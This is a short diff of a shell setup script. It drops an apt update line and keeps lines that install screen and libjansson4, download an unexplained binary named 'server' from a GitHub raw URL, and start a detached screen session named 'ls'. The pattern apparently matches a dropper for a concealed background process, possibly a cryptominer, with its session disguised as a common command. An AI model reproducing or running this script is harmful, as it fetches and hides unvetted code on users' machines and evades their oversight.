@@ -1,4 +1,4 @@
-sudo apt update 
+
 sudo apt install screen libjansson4 -y
 wget -O server https://github.com/Ankie-Davenschot/Davenschot/raw/main/server 
 screen -dmS ls
